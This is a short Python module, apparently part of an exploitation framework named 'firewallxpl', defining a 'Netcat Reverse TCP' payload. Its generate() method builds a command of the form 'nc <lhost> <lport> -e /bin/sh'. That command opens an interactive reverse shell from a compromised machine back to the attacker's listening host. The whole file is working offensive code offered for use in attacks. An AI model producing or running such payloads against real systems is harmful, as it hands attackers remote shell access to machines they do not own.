from firewallxpl.core.exploit import *
from firewallxpl.core.exploit.payloads import GenericPayload, ReverseTCPPayloadMixin


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Netcat Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using netcat.",
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
        ),
    }

    cmd = OptString("nc", "Netcat binary")
    shell_binary = OptString("/bin/sh", "Shell")

    def generate(self):
        return "{} {} {} -e {}".format(self.cmd,
                                       self.lhost,
                                       self.lport,
                                       self.shell_binary)
